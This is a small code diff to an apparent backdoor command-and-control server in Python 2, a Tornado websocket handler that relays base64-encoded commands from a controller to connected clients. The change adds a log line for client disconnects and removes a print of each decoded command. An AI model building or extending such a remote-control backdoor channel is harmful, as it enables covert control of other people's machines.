@@ -51,6 +51,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
     def on_close(self):
         if self.ID in BackdoorSocketHandler.clients:
+            print 'client lose connection: ' + str(self.ID) + ' -- ' + \
+                  self.request.remote_ip + '(' + self.HOST_NAME + ')'
             BackdoorSocketHandler.clients.pop(self.ID)
 
     def send_data(self, data):
@@ -70,7 +72,6 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
             if self.is_controller and 'cmd' in msg:
                 command = b64decode(msg['cmd'])
-                print command
                 self.parse_command(command)
 
             elif not self.is_controller and 'to' in msg:
